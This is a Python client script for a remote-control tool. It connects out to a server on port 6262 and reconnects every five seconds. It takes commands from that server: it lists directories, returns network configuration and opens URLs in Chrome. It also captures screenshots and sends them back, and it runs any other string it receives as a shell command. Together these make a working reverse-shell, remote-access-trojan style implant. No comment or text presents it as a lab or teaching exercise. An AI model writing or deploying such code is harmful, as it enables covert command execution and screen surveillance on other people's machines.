import socket
import time
import os
import subprocess
import pyautogui
from selenium import webdriver

BUFFER = 65536

def get_ipconfig():
    result = subprocess.run(["ipconfig"], capture_output=True, text=True, encoding="utf-8", errors="ignore")
    return result.stdout

def connect_to_server(ip: str, port: int):
    client = socket.socket()
    client.connect((ip, port))
    print("Connected to server")

    while True:
        encoded_in = client.recv(BUFFER)
        decoded_in = encoded_in.decode()

        print(f"Received from server: {decoded_in}")

        if decoded_in == "dir":
            response = os.popen('dir').read()
        elif decoded_in == "ip":
            response = get_ipconfig()
        elif decoded_in.startswith("open "):  # Recognize "open + url"
            url = decoded_in.split("open ", 1)[1]
            print(f"Opening URL: {url}")
            try:
                driver = webdriver.Chrome()
                driver.get(url)
                driver.maximize_window()
                time.sleep(1.5)
                driver.implicitly_wait(10)
                client.send("page_loaded".encode())
                response = f"Opened {url}"
            except Exception as e:
                response = f"Error opening URL: {str(e)}"
        elif decoded_in == "screenshot":
            screenshot = pyautogui.screenshot()
            screenshot.save("screenshot.jpg")

            with open("screenshot.jpg", 'rb') as image:
                response = image.read()
        else:
            try:
                os.popen(decoded_in)
                response = f"Executed {decoded_in}"
            except Exception:
                response = "Command execution error"

        if isinstance(response, str):
            client.send(response.encode())
        elif isinstance(response, bytes):
            client.send(response)

def main():
    ip = "127.0.0.1"
    port = 6262
    while True:
        try:
            connect_to_server(ip, port)
        except Exception as e:
            print(e)
            time.sleep(5)

if __name__ == '__main__':
    main()
